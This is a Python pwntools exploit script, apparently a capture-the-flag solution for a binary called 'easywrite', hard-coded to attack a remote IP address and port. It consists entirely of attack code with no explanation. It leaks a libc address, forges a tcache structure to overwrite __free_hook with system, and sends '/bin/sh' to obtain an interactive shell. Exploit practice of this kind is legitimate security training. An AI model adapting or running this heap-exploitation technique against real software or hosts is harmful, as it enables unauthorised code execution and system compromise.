from pwn import *

elf = context.binary = ELF('./easywrite')
libc = ELF("./libc.so.6")

host = args.HOST or '124.156.183.246'
port = int(args.PORT or 20000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

p.recvuntil(":")
libc_base = int(p.recvline().strip(), 16) - libc.sym["setbuf"]
log.info('Libc_base: {}'.format(hex(libc_base)))

# Can be found with heap chunks & search_pattern <pattern>
tcache_ptr = libc_base + 0x1f34f0

log.info('Tcache_ptr: {}'.format(hex(tcache_ptr)))
fake = p32(0) + p32(1)
fake = fake.ljust(0x12 * 8,'\x00')
fake += p64(libc_base + libc.sym["__free_hook"] - 0x10)

p.recvuntil('Input your message:')
p.sendline(fake)

p.recvuntil('Where to write?:')
p.send(p64(tcache_ptr))

p.recvuntil('Any last message?:')
p.sendline('/bin/sh\x00' + p64(0) + p64(libc_base + libc.sym['system']))
p.interactive()